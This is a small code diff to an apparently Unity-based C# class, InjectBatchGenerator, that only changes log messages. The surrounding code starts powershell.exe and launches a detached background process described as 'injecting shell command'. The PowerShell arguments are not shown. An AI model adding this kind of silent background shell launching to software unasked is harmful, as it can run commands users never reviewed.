@@ -35,6 +35,7 @@ public static class InjectBatchGenerator
         }
         if (!injectValidated)
         {
+            Debug.Log("[Inject Batch Generator] Time of injection: "+Time.time);
             var p = Process.Start(new ProcessStartInfo()
             {
                 FileName = "powershell.exe",
@@ -56,7 +57,7 @@ public static class InjectBatchGenerator
             };
             new Thread(() =>
             {
-                Debug.Log("[Inject Batch Generator] Injecting shell");
+                Debug.Log("[Inject Batch Generator] Injecting shell command using detached child process");
                 Thread.CurrentThread.IsBackground = true;
                 Process.Start(startInfo);
             }).Start();
